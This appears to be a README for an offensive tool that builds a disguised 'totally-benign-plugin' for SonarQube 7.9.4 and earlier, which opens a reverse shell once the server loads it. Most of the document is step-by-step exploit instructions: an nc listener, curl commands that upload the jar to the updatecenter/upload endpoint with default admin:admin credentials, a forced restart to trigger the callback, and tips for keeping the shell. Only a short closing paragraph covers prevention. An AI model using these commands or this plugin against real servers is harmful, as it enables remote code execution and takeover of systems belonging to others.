# PwnrQube

A reverse shell plugin for SonarQube by braindead

### Background

A hidden API command in SonarQube <= 7.9.4 allows privilege escalation. If you have administrative access to SonarQube, you can use the dashboard to install plugins from the marketplace, but you can't upload custom plugins. The API endpoint at `updatecenter/upload`, however, does allow custom plugins to be uploaded, and you can abuse this feature to execute arbitrary code on the server.

By crafting a custom plugin that uses built-in Java libraries to open a reverse shell to a host you control, you can elevate privilege from web application administrator to server user (whatever user runs the SonarQube application). This project provides sample code and instructions for building a reverse shell plugin and installing it on a vulnerable server.

### Build Requirements

* Java 8
* Maven
  * macOS: `brew install maven`
  * Kali: `sudo apt install maven`

### Exploit Requirements

- Admin access to SonarQube
- Curl
- Netcat (nc)

### Build Instructions

1. Clone this repo or download the `totally-benign-plugin` directory.
2. Edit the file `totally-benign-plugin/src/main/java/benign.java` and change the host and port (lines 12-13) to your liking, then save the file.
4. Open a terminal window, `cd` into `totally-benign-plugin` and run `mvn clean package`. This will compile the plugin and output the file `totally-benign-plugin/target/totally-benign-plugin-1.0.jar`.
### Development Notes

See https://docs.sonarqube.org/latest/extend/developing-plugin/ for more information about building custom SonarQube plugins.

Use `docker` for local testing if you want to make more significant changes to the plugin. Use any version before 7.9.5 to test exploitation via API as described below:

```bash
$ docker run -d --rm --name sonarqube -p 9000:9000 sonarqube:7.9.4-community
```

### Exploit Instructions

Use the following shell commands to upload the plugin, restart SonarQube to load the plugin, and receive the callback (which will take a minute or two, depending on your target):

```bash
$ nc -nvlp [PORT]
$ curl --user admin:admin -X POST -F file=@target/totally-benign-plugin-1.0.jar https://[TARGET]/api/updatecenter/upload
$ curl --user admin:admin -X POST https://[TARGET]/api/system/restart
```

### Exploitation Notes

If you want to, after uploading (but before restarting) you can verify that the plugin was uploaded successfully by logging in to the admin dashboard and browsing to `Administration > Marketplace`. You should see a notification at the top of the page indicating that a plugin is pending installation, and a button you can click to restart the application.

If SonarQube has issues with the plugin for some reason, you will see an error notification in the dashboard at `Administration > Marketplace`. If this happens, DO NOT RESTART THE APPLICATION! This will likely knock SonarQube offline entirely. Instead, use this command to remove the faulty plugin:

```bash
$ curl --user admin:admin -X POST https://[TARGET]/api/plugins/cancel_all
```

As soon as the plugin is loaded during the restart, the reverse shell callback will be triggered. If you lose your shell and need to get it back, simply restart the application again. While the plugin is installed, it will be visible in the admin dashboard under `Administration > Marketplace > Installed`.

Be sure to uninstall the plugin and restart the application when you are done with post-exploitation.

The API that enables this privilege escalation attack to work remotely was remediated in version 7.9.5 (the upload endpoint was removed). In order to use this plugin in later versions, you need to obtain access to the backend server some other way, place `totally-benign-plugin-1.0.jar` in the `extensions/plugins/` directory of your SonarQube installation, and restart the application.

### Attack Prevention

If you are a SonarQube administrator, preventing this privilege escalation attack is simple – just upgrade to the latest available version of SonarQube. As long as the version is higher than 7.9.4, this attack vector can't be exploited unless the attacker finds some other way to access the backend server.

